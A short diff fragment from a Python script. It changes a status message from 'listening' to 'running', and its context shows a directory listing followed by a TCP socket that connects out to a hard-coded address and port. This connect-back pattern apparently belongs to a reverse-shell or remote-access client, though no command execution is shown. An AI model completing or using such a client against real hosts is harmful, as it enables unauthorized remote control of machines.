@@ -7,7 +7,7 @@ import os
 Directory = []
 os.listdir()
 
-print("listening...\n")
+print("running...\n")
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("10.0.0.1", 1234))
 
